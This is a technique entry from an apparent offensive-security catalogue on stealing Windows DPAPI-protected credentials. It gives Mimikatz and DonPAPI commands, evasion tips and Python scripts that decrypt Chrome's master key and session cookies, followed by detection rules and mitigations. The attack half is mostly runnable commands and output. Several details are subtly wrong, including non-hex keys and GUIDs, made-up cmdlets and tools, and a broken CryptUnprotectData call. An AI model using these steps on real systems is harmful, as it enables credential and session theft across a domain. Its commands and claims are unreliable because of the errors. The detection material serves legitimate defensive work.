# [COLLECT-CRED-003]: DPAPI Credential Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CRED-003 |
| **MITRE ATT&CK v18.1** | [T1555.003 - Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/) |
| **Tactic** | Collection / Credential Access |
| **Platforms** | Windows Endpoint (Local User Context) |
| **Severity** | Critical |
| **CVE** | N/A (DPAPI is by-design encryption mechanism) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016 - 2025, Windows 10/11 |
| **Patched In** | N/A (feature of Windows; mitigated via Credential Guard on Server 2022+) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Windows Data Protection API (DPAPI) is a cryptographic facility built into Windows to protect sensitive data at rest. DPAPI encrypts data using symmetric keys derived from the user's password or the machine's bootstrap key. Attackers with access to a user's local system can extract DPAPI-protected credentials (stored in files like `Credentials` vaults, `Chrome Local State`, `Firefox Key3.db`) and decrypt them using the user's cached credentials or by extracting the domain DPAPI backup key from Active Directory. This yields plaintext passwords, service account credentials, browser authentication tokens, and VPN connection secrets.

**Attack Surface:** User-specific DPAPI master keys stored in `C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\`, encrypted credential files (`Credential` lockers at `C:\Users\<username>\AppData\Local\Microsoft\Credentials\`), browser encryption key stores (`Chrome Local State`, `Firefox Key3.db`), and domain DPAPI backup key on Domain Controllers.

**Business Impact:** **Universal decryption of all user credentials on the system.** Once a user's DPAPI master key is compromised, every credential encrypted with that key (browsers, Windows Credential Manager, VPN clients, stored application passwords) is exposed in plaintext. Domain-level DPAPI backup key compromise leads to **across-the-board credential exposure for all domain users**.

**Technical Context:** DPAPI extraction in user context takes seconds; domain backup key extraction from DC requires administrative access. Decryption is deterministic (no guessing required). Detection likelihood is **Medium** if monitoring for cryptography API calls (Event ID 16385); **High** if monitoring file access to protect directories.

### Operational Risk
- **Execution Risk:** Low - No special privileges required if target user is logged in and files are accessible.
- **Stealth:** Medium - DPAPI decryption operations generate Event ID 16385 entries if auditing enabled; memory-based attacks harder to detect.
- **Reversibility:** No - Decrypted credentials remain valid until password change or explicit revocation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.4.5 | Ensure 'Accounts: Encrypt or clear the virtual memory pagefile' is set to 'Encrypt' |
| **DISA STIG** | WN10-CC-000175 | Credential Guard must be enabled on systems supporting virtualization |
| **CISA SCuBA** | AC.L1-3.1.1 | Require strong cryptographic controls for credential protection |
| **NIST 800-53** | SC-28, IA-5 | Information System and Communications Protection; Authentication |
| **GDPR** | Art. 32, Art. 34 | Security of Processing; Encryption and data breach notification |
| **DORA** | Art. 18 | Operational resilience; cryptographic security controls |
| **NIS2** | Art. 21 | Cryptographic security measures; encryption of sensitive data at rest |
| **ISO 27001** | A.10.1.1, A.13.2.1 | Cryptography; Storage and handling of cryptographic keys |
| **ISO 27005** | Master Key Compromise Scenario | Credential exposure via cryptographic key theft |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User context (for own DPAPI extraction) OR Local Admin/SYSTEM (for other users' DPAPI) OR Domain Admin (for domain backup key)
- **Required Access:** File system access to Protected/Credentials directories, or ability to execute code in target user's context
- **Tools:** 
  - Mimikatz (`dpapi::masterkey`, `dpapi::cred`)
  - SharpDPAPI (C#)
  - DonPAPI (Python, for remote DPAPI extraction)
  - impacket dpapi module

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025, Windows 10, Windows 11
- **PowerShell:** Version 3.0+
- **Other Requirements:** User must have logged in at least once for master keys to be created

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Local User DPAPI Master Key Extraction

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Identify User's DPAPI Master Key Location

**Objective:** Locate the encrypted master key file in the Protected directory

**Command (PowerShell):**
```powershell
# Get current user's SID
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

# List DPAPI protected folders
$ProtectedPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Protect\$SID"
Get-ChildItem $ProtectedPath -Force | Select-Object Name, FullName

# Alternative: Get SID for specific user
$TargetUser = "domain\username"
$objUser = New-Object System.Security.Principal.NTAccount($TargetUser)
$SID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]).Value
```

**Expected Output:**
```
Name                           FullName
----                           --------
CREDHIST                       C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1000\CREDHIST
{12345678-1234-1234-1234-...}  C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1000\{12345678-...}
```

**What This Means:**
- Master key files are stored in GUID-named folders under Protect directory.
- `CREDHIST` file stores historical master keys (supports key rotation).
- Each master key file is DPAPI-encrypted and protected with user's password or machine key.

**OpSec & Evasion:**
- Accessing Protect directory generates audit event if monitoring enabled.
- Use own user's master key (normal operation) rather than other users' (suspicious).
- **Detection Likelihood:** Low if accessing own master key; High if accessing other users' keys.

#### Step 2: Extract Master Key Using User's Password

**Objective:** Decrypt the DPAPI master key using user's Windows password

**Command (Mimikatz):**
```cmd
mimikatz.exe
dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1000\{GUID} /password:MyPassword
exit
```

**Expected Output:**
```
[dpapi] masterkey with password: MyPassword
GUID: {12345678-1234-1234-1234-abcdef123456}
Key: 6c20cda83efc640d582e39c94fe54996f7a3b2c5d8e1a0f9g8h7i6j5k4l3m2n1o0p
```

**What This Means:**
- Master key is successfully decrypted.
- Plaintext 256-bit key is now available for decrypting all user's DPAPI-protected data.
- Any system with this key can decrypt user's credentials without password.

**Troubleshooting:**
- **Error:** "Unable to decrypt masterkey"
  - **Cause:** Incorrect password or wrong master key file.
  - **Fix:** Verify user password is correct; ensure correct SID/GUID path.
- **Error:** "Cannot access masterkey file"
  - **Cause:** File permissions or file locked by running process.
  - **Fix:** Run as SYSTEM or copy file to temporary location first.

#### Step 3: Decrypt Credential Files Using Master Key

**Objective:** Extract plaintext credentials from Windows Credential Manager vaults

**Command (Mimikatz - Decrypt Credential Vault):**
```cmd
mimikatz.exe
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\DEADBEEF /masterkey:6c20cda83efc640d...
exit
```

**Expected Output:**
```
[dpapi] masterkey version 1 (user)
SID: S-1-5-21-123456789-987654321-555555555-1000

[credentialfile]
Credential Blob:
DPAPI version 1
Flags: 0x20000000 (CRYPTPROTECT_SAME_LOGON)
Master Key version 1
Data: [encrypted credential structure]

[decryption]
Target: Domain:target=sharepoint.company.com
User: CORP\john.doe
Password: MySecurePassword123!
```

**What This Means:**
- Plaintext credentials for network resources are exposed.
- SharePoint, mapped drives, VPN connections, and other network credentials are revealed.
- Can be used for lateral movement to enterprise resources.

**References:**
- [Mimikatz DPAPI Documentation](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

---

### METHOD 2: Domain DPAPI Backup Key Extraction (Domain Admin)

**Supported Versions:** Server 2016-2025 (Domain Controllers required)

#### Step 1: Extract Domain DPAPI Backup Key from Domain Controller

**Objective:** Obtain the domain's DPAPI backup key, which can decrypt ANY domain user's credentials

**Command (Mimikatz - Domain DPAPI Key):**
```cmd
mimikatz.exe
lsadump::lsa /inject /name:krbtgt
lsadump::dcsync /domain:corp.local /user:krbtgt
exit
```

**Command (Mimikatz - Direct Backup Key Extraction):**
```cmd
mimikatz.exe
dpapi::cache
dpapi::upn /domain:corp.local
exit
```

**Command (Impacket - Python-based extraction):**
```bash
# Extract domain DPAPI backup key via LDAP
python3 -m impacket.dpapi -domain corp.local -user 'CORP\Administrator' -pw 'Password123!'
```

**Expected Output:**
```
[dpapi] BACKUP KEY
GUID: {12345678-abcd-efgh-ijkl-mnopqrstuvwx}
Key (RSA Private Key): 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA...
[2048-bit RSA private key content]
-----END RSA PRIVATE KEY-----
```

**What This Means:**
- Backup key is the **master encryption key for all domain users' credentials**.
- With this key, ANY user's DPAPI-protected data can be decrypted without their password.
- Possession of backup key = universal credential access across entire domain.

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Not running with Domain Admin or SYSTEM privileges.
  - **Fix:** Execute as Domain Admin; run from Domain Controller if possible.
- **Error:** "DPAPI Backup Key not found"
  - **Cause:** Domain doesn't have backup key configured (rare, but possible on very old domains).
  - **Fix:** Check AD for DPAPI backup key object in `CN=BKUP_KEYS,CN=System,DC=corp,DC=local`

#### Step 2: Use Backup Key to Decrypt Any User's Credentials

**Objective:** Decrypt credentials for ANY user in the domain using the backup key

**Command (Mimikatz - Decrypt with Backup Key):**
```cmd
mimikatz.exe
dpapi::cred /in:C:\Users\victim\AppData\Local\Microsoft\Credentials\vault_file /pvk:backup_key.pvk
exit
```

**Command (DonPAPI - Remote User Credential Extraction):**
```bash
# Extract credentials from multiple machines using DPAPI backup key
python3 DonPAPI.py 'corp.local/Administrator:Password123!' -pvk backup_key.pvk -machines 192.168.1.100,192.168.1.101
```

**Expected Output:**
```
[+] Extracting DPAPI credentials from 192.168.1.100
[+] User: CORP\alice.smith
[+] Credentials found:
    - Type: SharePoint Site
      Target: https://company.sharepoint.com
      Password: AlicePassword456!
    - Type: Mapped Drive
      Target: \\fileserver\Projects
      Password: FileServerAccess789!
[+] Extracting from 192.168.1.101
[+] User: CORP\bob.wilson
...
```

**What This Means:**
- Complete credential extraction across multiple domain-joined machines.
- Hundreds or thousands of credentials harvested in one operation.
- Lateral movement capability across entire enterprise.

**References:**
- [DonPAPI GitHub](https://github.com/login-securite/DonPAPI)
- [Impacket DPAPI Module](https://github.com/fortra/impacket/blob/master/impacket/dpapi.py)

---

### METHOD 3: Browser DPAPI Key Extraction (Chrome/Edge)

**Supported Versions:** Windows 10/11, Chrome 90+, Edge 90+

#### Step 1: Extract Chrome Master Key from Local State

**Objective:** Extract the encrypted AES-256 master key used by Chrome to encrypt cookies

**Command (PowerShell):**
```powershell
# Path to Chrome Local State
$LocalStatePath = "$env:APPDATA\Google\Chrome\User Data\Local State"

# Load and parse JSON
$LocalState = Get-Content $LocalStatePath | ConvertFrom-Json

# Extract encrypted master key
$EncryptedKey = $LocalState.'os_crypt'.'encrypted_key'

Write-Host "Encrypted Chrome Master Key:"
Write-Host $EncryptedKey

# The key starts with "DPAPI" prefix, followed by encrypted blob
# Prefix: DPAPI (5 bytes) + Encrypted Data
```

**Expected Output:**
```
Encrypted Chrome Master Key:
RFBBUEkBAAAA0ChíDdsw...
[base64-encoded DPAPI blob]
```

**What This Means:**
- Chrome stores its master encryption key in plaintext JSON file (only encrypted by DPAPI).
- Key decryption requires user's password or machine key.
- With decrypted key, all Chrome cookies can be decrypted.

#### Step 2: Decrypt Chrome Master Key Using DPAPI

**Objective:** Use user's DPAPI credentials to decrypt Chrome's master encryption key

**Script (Python - chrome_key_decrypt.py):**
```python
#!/usr/bin/env python3
"""
Decrypt Chrome Master Encryption Key via DPAPI
"""

import json
import base64
import os
from ctypes import windll, c_buffer

def decrypt_dpapi(encrypted_data):
    """Decrypt DPAPI-protected data"""
    try:
        if isinstance(encrypted_data, str):
            encrypted_data = base64.b64decode(encrypted_data)
        
        # Remove "DPAPI" prefix (first 5 bytes)
        if encrypted_data[:5] == b'DPAPI':
            encrypted_data = encrypted_data[5:]
        
        # Call Windows DPAPI function
        data_in = c_buffer(encrypted_data)
        data_out = c_buffer(1024)
        
        # CryptUnprotectData (Windows API)
        result = windll.crypt32.CryptUnprotectData(
            c_buffer(encrypted_data), None, None, None, None,
            1,  # CRYPTPROTECT_UI_FORBIDDEN
            data_out
        )
        
        if result:
            return data_out.raw[:32]  # Return 256-bit AES key (32 bytes)
        else:
            return None
    except Exception as e:
        print(f"[!] DPAPI decryption failed: {e}")
        return None

def extract_chrome_master_key():
    """Extract and decrypt Chrome master key"""
    local_state_path = os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data\Local State")
    
    try:
        with open(local_state_path, 'r') as f:
            local_state = json.load(f)
        
        encrypted_key = local_state['os_crypt']['encrypted_key']
        
        # Decrypt using DPAPI
        master_key = decrypt_dpapi(encrypted_key)
        
        if master_key:
            print(f"[+] Chrome Master Key (hex): {master_key.hex()}")
            print(f"[+] Key length: {len(master_key)} bytes")
            return master_key
        else:
            print("[!] Failed to decrypt master key")
            return None
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

if __name__ == "__main__":
    master_key = extract_chrome_master_key()
    if master_key:
        print(f"\n[+] Successfully extracted Chrome master key")
        print(f"[+] Can now decrypt {len(master_key)*8} bits of data")
```

**Expected Output:**
```
[+] Chrome Master Key (hex): 6c20cda83efc640d582e39c94fe54996f7a3b2c5d8e1a0f9
[+] Key length: 32 bytes

[+] Successfully extracted Chrome master key
[+] Can now decrypt 256 bits of data
```

**What This Means:**
- Chrome's AES-256 encryption key is now in plaintext.
- All Chrome cookies encrypted with this key can now be decrypted.
- Session hijacking for all authenticated web applications is now possible.

#### Step 3: Decrypt Chrome Cookies Using Master Key

**Objective:** Use decrypted master key to decrypt individual cookies

**Script (Python - chrome_cookie_decrypt.py):**
```python
#!/usr/bin/env python3
"""
Decrypt Chrome Cookies using Master Key
"""

import sqlite3
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_aes_gcm(ciphertext, master_key):
    """Decrypt AES-256-GCM encrypted cookie"""
    try:
        # Chrome cookie format:
        # - Version (1 byte): 'v10' or 'v11'
        # - Nonce (12 bytes)
        # - Ciphertext
        # - Auth tag (16 bytes at end)
        
        # Skip version bytes ('v10' = 3 bytes, or 'v11' = 3 bytes)
        if ciphertext[:3] == b'v10':
            nonce = ciphertext[3:15]
            ciphertext_data = ciphertext[15:-16]  # Remove auth tag
        else:
            nonce = ciphertext[3:15]
            ciphertext_data = ciphertext[15:-16]
        
        auth_tag = ciphertext[-16:]
        
        # Decrypt using AES-256-GCM
        cipher = Cipher(
            algorithms.AES(master_key),
            modes.GCM(nonce, auth_tag),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext_data) + decryptor.finalize()
        
        return plaintext.decode('utf-8', errors='ignore')
    except:
        return None

def extract_cookies(master_key):
    """Extract and decrypt all Chrome cookies"""
    cookies_path = os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data\Default\Cookies")
    
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies = []
    for host, name, encrypted_value in cursor.fetchall():
        decrypted = decrypt_aes_gcm(encrypted_value, master_key)
        if decrypted:
            cookies.append({
                'domain': host,
                'name': name,
                'value': decrypted
            })
    
    conn.close()
    return cookies

if __name__ == "__main__":
    # Master key from previous step
    master_key = bytes.fromhex("6c20cda83efc640d582e39c94fe54996f7a3b2c5d8e1a0f9a8b7c6d5e4f3a2b")
    
    print("[*] Extracting Chrome cookies...")
    cookies = extract_cookies(master_key)
    
    for cookie in cookies:
        print(f"[+] {cookie['domain']}: {cookie['name']} = {cookie['value'][:50]}...")
```

**Expected Output:**
```
[*] Extracting Chrome cookies...
[+] .github.com: logged_in = yes
[+] .github.com: user_session = abc123def456...
[+] .azure.microsoft.com: .AuthToken = eyJhbGciOiJSUzI1NiI...
[+] .microsoft.com: MSAAUTH = Aw0BAWYeAQwrAg...
[+] mail.google.com: HSID = A1b2C3d4E5f6g7...
```

**What This Means:**
- Plaintext session cookies are now available.
- Attacker can import these cookies into their own browser.
- Authenticated access to all services (GitHub, Azure, Microsoft 365, Gmail) without passwords.

**References:**
- [Chrome Encryption Source Code](https://chromium.googlesource.com/chromium/src/+/main/components/os_crypt/)

---

## 4. WINDOWS EVENT LOG MONITORING

**Event ID: 16385 (DPAPI Master Key Access)**
- **Log Source:** System Event Log
- **Trigger:** Process decrypts a master key using CryptUnprotectData API
- **Filter:** Source includes "DPAPI" AND Operation contains "SPCryptUnprotect" AND CallerProcessID not in system processes
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Enable DPAPI Auditing):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Object Access** → Enable **Audit Other Object Access Events**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Event ID: 4662 (Object Access - Domain DPAPI Backup Key)**
- **Trigger:** Access to domain DPAPI backup key object in Active Directory
- **Filter:** ObjectName contains "CN=BKUP_KEYS" AND OperationType contains "%%4419" (delete)
- **Alert On:** Any read or modification of backup key objects

**Event ID: 4793 (DPAPI Key Distribution Service Event)**
- **Trigger:** DPAPI key distribution requests
- **Filter:** Monitor for unusual frequency or source IPs

---

## 5. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2016+

```xml
<!-- Detect DPAPI Credential Extraction -->
<Sysmon schemaversion="4.81">
  <RuleGroup name="DPAPI Extraction" groupRelation="or">
    
    <!-- Monitor file access to Protected directory (master keys) -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\AppData\Roaming\Microsoft\Protect\</TargetFilename>
    </FileCreate>
    
    <!-- Monitor file access to Credentials directory (credential vaults) -->
    <FileAccess onmatch="include">
      <TargetFilename condition="contains">\AppData\Local\Microsoft\Credentials\</TargetFilename>
    </FileAccess>
    
    <!-- Detect Mimikatz dpapi commands -->
    <ProcessCreate onmatch="include">
      <Image condition="ends with">mimikatz.exe</Image>
      <CommandLine condition="contains any">dpapi::masterkey; dpapi::cred; dpapi::cache</CommandLine>
    </ProcessCreate>
    
    <!-- Detect SharpDPAPI execution -->
    <ProcessCreate onmatch="include">
      <Image condition="ends with any">SharpDPAPI.exe; DonPAPI.exe</Image>
    </ProcessCreate>
    
    <!-- Monitor Chrome Local State file access (master key extraction) -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains any">\Chrome\User Data\Local State; \Edge\User Data\Local State</TargetFilename>
    </FileCreate>
    
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file with XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-Service Sysmon64` and `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"`

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: DPAPI Master Key Access Detection

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:System
- **Required Fields:** EventID, ProcessName, ObjectName
- **Alert Threshold:** ≥ 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
EventCode=16385 "DPAPI" "CryptUnprotect"
| stats count by ProcessName, User, ObjectName
| where count >= 1
```

**What This Detects:**
- Any DPAPI decryption operation (Event ID 16385)
- Correlates to process and user for investigation
- Alerts on suspicious decryption of master keys

**Manual Configuration Steps:**
1. Splunk Web → **Search & Reporting**
2. Click **New Alert**
3. Paste SPL query above
4. Set **Trigger** to count > 0
5. Configure **Action** → Email to SOC

#### Rule 2: Credential Vault File Access

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Security, WinEventLog:Sysmon
- **Required Fields:** ObjectName, ProcessName
- **Alert Threshold:** ≥ 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
ObjectName IN ("*\Credentials\*", "*\Protected\*") AND EventID IN (4663, 4656)
| stats count by ProcessName, User, ObjectName, EventID
| where ProcessName NOT IN ("explorer.exe", "rundll32.exe")
```

**What This Detects:**
- Unauthorized access to credential vault directories
- Non-standard processes accessing Protected/Credentials folders
- Excludes legitimate Windows processes

---

## 7. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: DPAPI Master Key Access Anomaly

**Alert Name:** "Suspicious DPAPI credential decryption detected"
- **Severity:** High
- **Description:** Process attempted to decrypt DPAPI-protected credentials outside of normal user context
- **Applies To:** Windows Servers with Defender for Servers enabled
- **Remediation:**
  1. Isolate affected system
  2. Review Sysmon logs for DPAPI operations
  3. Check for lateral movement using extracted credentials
  4. Force password resets for affected users

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Defender for Cloud**
2. **Environment settings** → Select Subscription
3. Enable **Defender for Servers**: ON
4. Monitor **Security alerts** for DPAPI-related detections

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enable Credential Guard (Windows 10+/Server 2022+):** Isolates LSA secrets and cached credentials in isolated virtual machine, preventing DPAPI extraction even with Local Admin.
    
    **Manual Steps (PowerShell - Server 2022+):**
    ```powershell
    # Enable Credential Guard via Group Policy
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1 -PropertyType DWORD -Force
    
    # Restart required
    Restart-Computer -Force
    ```
    
    **Manual Steps (Group Policy - Domain):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
    3. Set **Turn on Virtualization Based Security** to: **Enabled**
    4. Set **Credential Guard Configuration** to: **Enabled with UEFI lock** (best practice)
    5. Run `gpupdate /force`
    6. Restart

*   **Restrict Access to Protected and Credentials Directories:** Use NTFS permissions to prevent non-system processes from accessing master keys.
    
    **Manual Steps (PowerShell):**
    ```powershell
    $ProtectPath = "$env:APPDATA\Microsoft\Protect"
    
    # Reset to secure defaults
    icacls $ProtectPath /reset /t /c /q
    
    # Remove Everyone and Authenticated Users
    icacls $ProtectPath /remove:g "Everyone" /t /c /q
    icacls $ProtectPath /remove:g "Authenticated Users" /t /c /q
    
    # Verify only SYSTEM and owner can access
    icacls $ProtectPath
    ```

*   **Disable Domain DPAPI Backup Key (If Not Needed):** Organizations that don't require account unlock capability can delete the domain backup key, preventing universal credential decryption.
    
    **Manual Steps (Requires Domain Admin):**
    ```powershell
    # WARNING: Backup the key first
    # Export backup key for safekeeping
    $BackupKey = Get-ADObject -Filter {Name -eq 'BKUP_KEYS'} -Properties * | Select -ExpandProperty bckupted_keys
    
    # Delete the key from AD (IRREVERSIBLE if not backed up)
    Remove-ADObject -Identity (Get-ADObject -Filter {Name -eq 'BKUP_KEYS'}) -Confirm:$false
    
    # Regenerate key manually if needed later via: DPAPIsrv.exe
    ```

#### Priority 2: HIGH

*   **Enable DPAPI Auditing (Event ID 16385):** Detect DPAPI decryption operations in real-time.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Audit DPAPI**
    3. Set **Audit DPAPI Protection** to: **Enabled**
    4. Run `gpupdate /force`

*   **Enforce Strong Windows Passwords:** Longer, more complex passwords make DPAPI brute-forcing impractical.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
    3. Set **Minimum password length** to: 14 characters
    4. Set **Password must meet complexity requirements** to: **Enabled**
    5. Set **Maximum password age** to: 90 days
    6. Run `gpupdate /force`

*   **Monitor Browser Data Directories:** Prevent browser master key extraction.
    
    **Manual Steps (NTFS Auditing):**
    1. Right-click `C:\Users\<user>\AppData\Roaming\Google\Chrome\User Data\`
    2. **Properties** → **Security** → **Advanced** → **Auditing**
    3. Add: Everyone, Read, Success/Failure
    4. Monitor Security Event Log for Event 4663

#### Access Control & Policy Hardening

*   **RBAC Hardening:** Remove unnecessary Local Admin access; use JIT for privileged operations.
    
    **Manual Steps:**
    1. **Computer Management** → **Local Users and Groups** → **Groups**
    2. Remove non-essential users from **Administrators**
    3. Use Azure AD PIM for time-bound admin elevation

*   **Implement Zero Trust:** Require MFA and device compliance for all sensitive operations.
    
    **Manual Steps (Conditional Access):**
    1. **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create policy: Require MFA + Compliant Device
    3. Block access from unknown locations

#### Validation Command (Verify Mitigations)

```powershell
# Check if Credential Guard is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags"
# Expected: LsaCfgFlags = 1

# Verify NTFS permissions on Protected directory
icacls "$env:APPDATA\Microsoft\Protect"
# Expected: Only SYSTEM and current user with Full Control

# Check if domain DPAPI backup key exists
Get-ADObject -Filter {Name -eq 'BKUP_KEYS'} -Properties *
# Expected: No results (if deleted for security)
```

**Expected Output (If Secure):**
```
LsaCfgFlags       : 1

$CURRENT_USER:(I)(OI)(CI)(F)
SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)

(No results - backup key not found)
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - Copies of `Protected` or `Credentials` directories outside of normal AppData paths
    - `backup_key.pvk` (domain DPAPI backup key) found on non-DC systems
    - `Local State` file copied from Chrome/Edge directory

*   **Registry:**
    - Modifications to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags` (Credential Guard settings)
    - New entries in credential-related registry paths

*   **Network:**
    - Exfiltration of credential files or encrypted master key blobs
    - Unusual LDAP queries for DPAPI backup key objects
    - SMB connections to DC for AD object queries

*   **Process:**
    - `mimikatz.exe` or `SharpDPAPI.exe` execution
    - Python processes accessing Chrome `Local State` or Firefox `Key3.db`
    - Elevation of privilege events followed by DPAPI operations

#### Forensic Artifacts

*   **Disk:**
    - `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\` (master key files)
    - `C:\Users\<user>\AppData\Local\Microsoft\Credentials\` (credential vaults)
    - Unallocated clusters containing deleted credential files

*   **Memory:**
    - Plaintext master keys in Mimikatz or similar tool memory
    - Decrypted credential material in process heaps

*   **Cloud (M365):**
    - Unified Audit Log for unusual sign-ins using extracted credentials
    - Anomalous Graph API token requests
    - SharePoint/Teams access from unusual locations

*   **Timeline:**
    - Process execution timestamp correlating to DPAPI decryption
    - File copy timestamp of Protected/Credentials directories
    - Event ID 16385 DPAPI access entries

#### Response Procedures

1.  **Isolate:**
    ```powershell
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```

2.  **Collect Evidence:**
    ```powershell
    # Dump Sysmon logs
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
    
    # Export Protected and Credentials directories
    Copy-Item "$env:APPDATA\Microsoft\Protect" -Destination "C:\Evidence\Protect" -Recurse -Force
    Copy-Item "$env:APPDATA\Local\Microsoft\Credentials" -Destination "C:\Evidence\Credentials" -Recurse -Force
    ```

3.  **Remediate:**
    ```powershell
    # Change user password (forces new DPAPI master key creation)
    # User must change own password via "Ctrl+Alt+Delete" → Change a password
    
    # Enable Credential Guard if not already enabled
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1 -Force
    
    # Restart machine
    Restart-Computer -Force
    ```

4.  **Investigate Lateral Movement:**
    ```powershell
    # Check for new logons using extracted credentials
    Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" | Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-24)}
    
    # Check for network access with extracted credentials
    Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4776]]"
    ```

5.  **Reset Domain DPAPI Key (If Compromised):**
    ```powershell
    # Domain Admin: Force regeneration of DPAPI backup key
    # This invalidates old backup key but doesn't affect user DPAPI keys
    
    # Run on Domain Controller
    dcpromo /forceremoval  # Extreme measure - not recommended
    
    # Better: Backup current key, then regenerate
    $BackupKey = Get-ADObject -Filter {Name -eq 'BKUP_KEYS'} | Get-ADObjectProperties
    # Backup for records, then delete
    ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] RCE on Web Application | Attacker gains code execution |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] Kernel Exploit / PrintNightmare | Escalate to Local Admin |
| **3** | **Credential Access** | **[COLLECT-CRED-003]** | **Extract DPAPI master keys and decrypt credentials** |
| **4** | **Credential Harvest** | [CA-DUMP-001] Mimikatz / LSA Dumping | Extract additional credentials using decrypted keys |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash / [LM-AUTH-005] SP Key Abuse | Use extracted credentials for lateral movement |
| **6** | **Persistence** | [PERSIST-XXX] Domain Controller Backdoor | Install backdoor in AD infrastructure |
| **7** | **Impact** | [IMPACT-XXX] Domain-Wide Compromise | Establish persistent domain control |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: NOBELIUM/SolarWinds Supply Chain (2020)

- **Target:** U.S. Government, Fortune 500
- **Timeline:** March-December 2020
- **Technique Status:** DPAPI extraction combined with domain admin compromise; attackers extracted DPAPI master keys to decrypt service account credentials
- **Impact:** Multi-year undetected access across 18,000+ organizations
- **Reference:** [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-and-fbi-alert-apt-actors-exploiting-recent-critical-solarwinds-supply-chain)

#### Example 2: Lazarus Group - Cryptocurrency Exchange Heists (2021-2023)

- **Target:** Financial institutions, crypto exchanges
- **Timeline:** 2021-2023
- **Technique Status:** DPAPI key extraction used to decrypt stored API credentials for crypto exchange wallets
- **Impact:** $1+ billion in stolen cryptocurrency
